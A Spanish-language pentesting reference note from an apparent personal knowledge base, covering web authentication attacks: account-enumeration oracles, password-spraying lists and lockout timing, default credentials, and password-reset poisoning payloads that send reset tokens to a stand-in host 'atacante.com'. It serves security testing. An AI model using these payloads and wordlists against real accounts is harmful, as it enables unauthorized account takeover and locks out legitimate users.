---
tipo: meta
aliases:
  - Payloads autenticación
  - Enumeración y contraseñas
tags:
  - meta/referencia
  - dominio/web
---

# Autenticación - matriz de referencia

> [!info] Referencia pura, no un zettel
> Tres secciones, una por fase del ciclo de vida. El criterio está en [[MOC - Autenticación]]; el bypass del segundo factor tiene matriz propia en [[MFA bypass - matriz de referencia]].

## Enumeración

### Dónde probar

Todos estos tocan la lista de cuentas. Alcanza con que uno filtre:

```
POST /login          POST /register
POST /forgot         POST /reset
POST /api/users/check
GET  /api/users/<id>
POST /invite         POST /share
```

El registro y la recuperación fallan más seguido que el acceso: son los que nadie revisó.

### Oráculo por mensaje

| Respuesta a cuenta inexistente | Respuesta a cuenta real | Filtra |
|---|---|---|
| "Usuario no encontrado" | "Contraseña incorrecta" | sí, obvio |
| "Correo no registrado" | "Te enviamos un enlace" | sí |
| Redirección a `/register` | Redirección a `/login?error` | sí |
| `404` | `401` | sí |
| Mismo texto, distinta longitud | — | sí, revisar respuesta cruda |

Comparar siempre la respuesta **cruda**, no la renderizada: la diferencia suele estar en un campo oculto, una cabecera o un espacio.

### Oráculo por tiempo

```
usuario_inexistente@x.com : responde en ~40 ms
usuario_real@x.com        : responde en ~350 ms
```

La diferencia es el cálculo del hash de la contraseña, que solo ocurre si la cuenta existe. Es lento a propósito, y esa lentitud es la fuga.

Método: diez mediciones por candidato, comparar medianas. Con diferencias de menos de 50 ms hace falta más muestras y descartar valores atípicos. Una sola medición no dice nada.

### Fuentes de candidatos

```
formato del correo corporativo: nombre.apellido@ / inicial+apellido@
LinkedIn, sitio web de la empresa, notas de prensa
metadatos de documentos publicados (autor)
commits en repositorios públicos
filtraciones previas asociadas al dominio
```

## Contraseñas

### Las que pagan en spraying

El patrón no es azaroso: **lo produce la propia política**. Exigir mayúscula, número y símbolo con rotación trimestral genera esto de forma predecible.

```
<Estación><Año>!        Verano2026!  Otoño2026!  Invierno2026!
<Mes><Año>!             Agosto2026!
<Empresa>123!           Acme123!
<Empresa>@<Año>         Acme@2026
Password1!  P@ssw0rd!  Welcome1!  Bienvenido1
Cambiame123  Temporal123  <Empresa>2026
```

Una por ronda. Empezar por la estación y el año en curso, que es la de mayor tasa.

### Calcular la ventana

Antes de rociar hay que fijar tres números y **dejar margen**:

```
umbral de bloqueo      → si no se conoce, asumir 3
ventana del contador   → si no se conoce, asumir 30 min
intentos por cuenta    → umbral - 2, nunca más
```

Una contraseña por ronda, una ronda por ventana. Ir más rápido bloquea usuarios reales, que es un incidente y no un hallazgo — ver la advertencia de [[Autenticación - password spraying]].

### Credenciales por defecto

Vale probarlas antes que cualquier ataque de volumen: cuestan una petición cada una.

```
admin:admin        admin:password     admin:<producto>
root:root          test:test          demo:demo
<producto>:<producto>
```

Y buscar las del producto concreto en su documentación, que suele publicarlas.

## Recuperación

### Destino controlado por el atacante

```
POST /forgot
email=victima@x.com&email=atacante@x.com
```

Parámetro duplicado: la validación lee el primero, el envío usa el segundo.

```
{"email": "victima@x.com", "returnUrl": "https://atacante.com/"}
```

Parámetro de destino, cuando existe.

```
POST /forgot
Host: atacante.com
X-Forwarded-Host: atacante.com
```

Contaminación de la cabecera `Host`. El enlace del correo se construye con el nombre de servidor que mandó el cliente: el mensaje llega a la víctima y el enlace apunta al atacante, que recibe el token cuando la víctima hace clic.

### Análisis del token

Pedir varios seguidos para la cuenta propia y compararlos:

```
¿Cambian de a uno?                 → secuencial
¿Comparten prefijo largo?          → derivado de tiempo o de un contador
¿Es base64 de algo legible?        → decodificar
¿Coincide con el hash de la fecha? → probar epoch en varios formatos
¿32 hex sin patrón?                → probablemente aleatorio, abandonar esta vía
```

### El resto del flujo

```
usar el token dos veces            → ¿se invalida al primer uso?
usar un token de hace días         → ¿expira?
token de la cuenta A sobre B       → ¿está atado a la cuenta?
completar sin el segundo factor    → ¿el reset saltea el MFA?
tras el cambio, ¿siguen vivas las sesiones previas?
```

La última pregunta es la que más se olvida y pertenece a [[MOC - Gestión de sesión]]: un cambio de contraseña que no invalida las sesiones activas deja al atacante adentro.
